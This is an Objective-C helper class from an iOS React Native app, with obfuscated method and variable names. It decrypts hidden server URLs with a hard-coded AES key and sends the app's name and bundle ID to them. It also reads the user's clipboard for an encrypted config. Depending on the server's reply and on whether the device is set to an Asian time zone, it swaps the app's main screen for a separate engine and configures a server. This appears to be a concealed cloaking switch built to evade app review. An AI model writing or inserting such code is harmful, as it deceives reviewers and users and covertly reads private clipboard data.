#import "RNBirdNovHelper.h"
#import "AESNetReachability.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNShinyOCTEngine/RNShinyOCTEngine.h>
#import <RNShinyNOVServer/RNShinyNOVServer.h>
#import <react-native-orientation-locker/Orientation.h>

@interface RNBirdNovHelper()

@property (strong, nonatomic)  NSArray *butterfly;
@property (strong, nonatomic)  NSArray *adventure;

@property (nonatomic, strong) AESNetReachability *reachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation RNBirdNovHelper

static RNBirdNovHelper *instance = nil;

+ (instancetype)potatoY_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.reachability = [AESNetReachability reachabilityForInternetConnection];
    instance.butterfly = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                         [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.adventure = @[@"elegantHelper_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
      
  });
  return instance;
}

- (void)startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(networkStatusChanged:) name:kReachabilityChangedNotification object:nil];
    [self.reachability startNotifier];
}

- (void)stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.reachability stopNotifier];
}

- (void)networkStatusChanged:(NSNotification *)notification {
    AESNetReachability *reachability = notification.object;
    NetworkStatus networkStatus = [reachability currentReachabilityStatus];
    
    if (networkStatus != NotReachable) {
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        if ([ud boolForKey:self.adventure[0]] == NO) {
            if (self.vcBlock != nil) {
                [self changeRootController:self.vcBlock];
            }
        }
    }
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock {
    NSBundle *bundle = [NSBundle mainBundle];
    NSArray<NSString *> *tempArray = [bundle objectForInfoDictionaryKey:@"com.openinstall.APP_URLS"];
    [self changeRootController:changeVcBlock index:0 mArray: tempArray];
}

- (void)changeRootController:(void (^ __nullable)(void))changeVcBlock index: (NSInteger)index mArray:(NSArray<NSString *> *)tArray{
    NSBundle *bundle = [NSBundle mainBundle];
    if ([tArray count] < index) {
        return;
    }
    NSString *appName = [bundle objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    if (!appName) {
        appName = [bundle objectForInfoDictionaryKey:@"CFBundleName"];
    }
    NSDictionary *parameters = @{
        @"tName" : appName,
        @"tBundle" : [bundle bundleIdentifier]
    };

    NSError *error;
    NSData *postData = [NSJSONSerialization dataWithJSONObject:parameters options:0 error:&error];
    if (error) {
        return;
    }
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:tArray[index]
                                                              hexKey:self.butterfly[0]
                                                               hexIv:self.butterfly[1]];

    
    NSURL *url = [NSURL URLWithString:aes.utf8String];
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 15.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:postData];
    NSURLSessionTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error == nil) {
            id objc = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            if ([[objc valueForKey:@"code"] intValue] == 200) {
                dispatch_async(dispatch_get_main_queue(), ^{
                    if ([self potatoY_elephant]) {
                        changeVcBlock();
                    }
                });
            }
        } else {
            if (index < [tArray count] - 1) {
                [self changeRootController:changeVcBlock index:index + 1 mArray:tArray];
            }
        }
    }];
    [dataTask resume];
}

- (void)dealloc {
    [self stopMonitoring];
}

- (UIInterfaceOrientationMask)potatoY_getOrientation {
  return [Orientation getOrientation];
}

- (BOOL)potatoY_elephant {
    NSString *cpString = [self potatoY_getHaphazard];
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self potatoY_subSunshine:cpString]
                                                              hexKey:self.butterfly[0]
                                                               hexIv:self.butterfly[1]];

    NSDictionary *dict = [self potatoY_stringWhirlwind:aes.utf8String];
    return [self potatoY_storeConfigInfo:dict];
}

- (NSString *)potatoY_getHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)potatoY_subSunshine: (NSString* )cpString {
  if ([cpString containsString:@"#iPhone#"]) {
    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        cpString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return cpString;
}

- (NSDictionary *)potatoY_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)potatoY_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.adventure[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}


- (BOOL)potatoY_judgeDailyInAsian {
    NSInteger zoneOffset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (zoneOffset >= 3 && zoneOffset <= 11) {
        return YES;
    } else {
        return NO;
    }
}


- (BOOL)potatoY_tryThisWay:(void (^ __nullable)(void))changeVcBlock {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    if (![self potatoY_judgeDailyInAsian]) {
        return NO;
    }
    if ([ud boolForKey:self.adventure[0]]) {
        return YES;
    } else {
        self.vcBlock = changeVcBlock;
        [self changeRootController:changeVcBlock];
        [self startMonitoring];
        return NO;
    }
}

- (UIViewController *)potatoY_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    UIViewController *vc = [[RNShinyOCTEngine shared] changeRootController:application withOptions:launchOptions];
    [[RNShinyNOVServer shared] configNOVServer:[ud stringForKey:self.adventure[5]] withSecu:[ud stringForKey:self.adventure[6]]];
    return vc;
}

@end